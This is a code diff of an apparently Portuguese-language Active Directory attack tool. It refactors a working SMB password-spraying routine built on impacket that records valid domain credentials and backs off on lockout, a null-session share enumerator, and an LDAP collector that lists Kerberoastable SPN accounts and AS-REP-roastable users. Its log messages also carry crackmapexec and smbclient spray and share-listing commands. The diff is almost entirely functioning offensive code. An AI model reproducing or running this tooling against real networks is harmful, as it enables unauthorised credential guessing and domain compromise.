@@ -90,7 +90,7 @@ def _build_banner():
         f"{D}{hl}{X}",
         f"{D}ldap  kerb  asrep  spray  smb  bloodhound{X}",
         f"{D}--dc  --domain  --user  --pass  --hash{X}",
-        f"{D}--output  --json  --bloodhound-out{X}",
+        f"{D}--output  --no-banner  --verbose{X}",
     ]
 
     out = [f"{G}{TL}{eq}{TR}{X}", f"{G}{VB}{sp}{VB}{X}"]
@@ -319,34 +319,31 @@ def password_spray(dc, domain, users, password, lockout_threshold=3, delay=1.0, 
     _log(f"Spray: {len(users)} usuarios | Senha: {password!r} | DC: {dc}", "INFO")
     _log(f"Threshold lockout: {lockout_threshold} | Delay: {delay}s entre tentativas", "ALERTA")
 
-    # Usa impacket via subprocess se disponivel
     try:
-        import subprocess
-        for i, user in enumerate(users):
-            try:
-                cmd = ["python3", "-c",
-                       f"from impacket.smbconnection import SMBConnection; "
-                       f"c = SMBConnection('{dc}', '{dc}'); "
-                       f"c.login('{user}', '{password}', '{domain}'); "
-                       f"print('OK')"]
-                r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
-                resultado["testados"] += 1
-                if "OK" in r.stdout:
-                    resultado["validos"].append({"user": user, "password": password})
-                    _log(f"CREDENCIAL VALIDA: {domain}\\{user}:{password}", "CRITICO")
-                elif "STATUS_ACCOUNT_LOCKED" in (r.stdout + r.stderr):
-                    resultado["lockout_suspeito"] = True
-                    _log(f"LOCKOUT detectado para {user} — pausando spray", "ALERTA")
-                    time.sleep(delay * 10)
-                if verbose:
-                    _log(f"Testado: {user} -> {'VALIDO' if resultado['validos'] and resultado['validos'][-1]['user'] == user else 'invalido'}", "INFO")
-                time.sleep(delay)
-            except subprocess.TimeoutExpired:
-                continue
-    except Exception as e:
-        _log(f"Impacket nao disponivel ou erro: {e}", "ALERTA")
+        from impacket.smbconnection import SMBConnection
+    except ImportError:
+        _log("Impacket nao disponivel. Instale: pip install impacket", "ALERTA")
         _log("Use: crackmapexec smb DC_IP -u users.txt -p 'Senha' --continue-on-success", "INFO")
         resultado["erro"] = "impacket nao disponivel"
+        return resultado
+
+    for user in users:
+        try:
+            conn = SMBConnection(dc, dc)
+            conn.login(user, password, domain)
+            resultado["validos"].append({"user": user, "password": password})
+            _log(f"CREDENCIAL VALIDA: {domain}\\{user}:{password}", "CRITICO")
+            conn.logoff()
+        except Exception as e:
+            err = str(e)
+            if "STATUS_ACCOUNT_LOCKED" in err:
+                resultado["lockout_suspeito"] = True
+                _log(f"LOCKOUT detectado para {user} - pausando spray", "ALERTA")
+                time.sleep(delay * 10)
+            elif verbose:
+                _log(f"Testado: {user} -> invalido ({err[:60]})", "INFO")
+        resultado["testados"] += 1
+        time.sleep(delay)
 
     _log(f"Spray finalizado: {resultado['testados']} testados | {len(resultado['validos'])} valido(s)", "OK")
     return resultado
@@ -371,29 +368,32 @@ def smb_enum(dc, domain, user=None, password=None, verbose=False):
     s.close()
     _log("Porta SMB 445 aberta", "OK")
 
-    # Tenta impacket
     try:
-        import subprocess
-        # Null session
-        cmd_null = ["python3", "-c",
-                    f"from impacket.smbconnection import SMBConnection; "
-                    f"c = SMBConnection('{dc}', '{dc}'); "
-                    f"c.login('', ''); "
-                    f"shares = c.listShares(); "
-                    f"print('NULL_OK'); "
-                    f"[print('SHARE:' + s['shi1_netname'].decode()) for s in shares]"]
-        r = subprocess.run(cmd_null, capture_output=True, text=True, timeout=5)
-        if "NULL_OK" in r.stdout:
-            resultado["null_session"] = True
-            _log("NULL SESSION bem-sucedida — enumeracao sem credenciais possivel", "CRITICO")
-        for linha in r.stdout.splitlines():
-            if linha.startswith("SHARE:"):
-                share = linha.replace("SHARE:", "").strip()
+        from impacket.smbconnection import SMBConnection
+        conn = SMBConnection(dc, dc)
+        try:
+            conn.login(user or '', password or '', domain)
+            if not user:
+                resultado["null_session"] = True
+                _log("NULL SESSION bem-sucedida - enumeracao sem credenciais possivel", "CRITICO")
+            else:
+                _log(f"Autenticado como {domain}\\{user}", "OK")
+        except Exception as e:
+            _log(f"Login SMB falhou: {e}", "ALERTA")
+            _log("Porta 445 aberta mas sem acesso autenticado", "INFO")
+            return resultado
+        try:
+            shares = conn.listShares()
+            for s in shares:
+                share = s['shi1_netname'].decode().rstrip('\x00')
                 resultado["shares"].append(share)
                 _log(f"Share encontrado: {share}", "ACHADO")
-    except Exception as e:
-        _log(f"Impacket nao disponivel: {e}", "ALERTA")
-        _log("Use: smbclient -L //{dc} -N  OU  crackmapexec smb {dc} --shares".format(dc=dc), "INFO")
+        except Exception as e:
+            _log(f"Erro ao listar shares: {e}", "ALERTA")
+        conn.logoff()
+    except ImportError:
+        _log("Impacket nao disponivel. Instale: pip install impacket", "ALERTA")
+        _log(f"Use: smbclient -L //{dc} -N  OU  crackmapexec smb {dc} --shares", "INFO")
         resultado["erro"] = "impacket nao disponivel"
 
     # Verifica assinatura (relay)
@@ -451,8 +451,12 @@ def bloodhound_lite(dc, domain, user=None, password=None, output_file="bloodhoun
             })
             if spns:
                 dados["spns"].append({"sam": sam, "spns": spns})
+                if verbose:
+                    _log(f"SPN: {sam} -> {spns[:2]}", "ACHADO")
             if uac & 0x400000:
                 dados["asrep"].append(sam)
+            elif verbose and not bool(uac & 0x2):
+                _log(f"Usuario: {sam} (grupos: {len(membros)})", "INFO")
 
         # Grupos
         conn.search(base_dn, "(objectClass=group)",
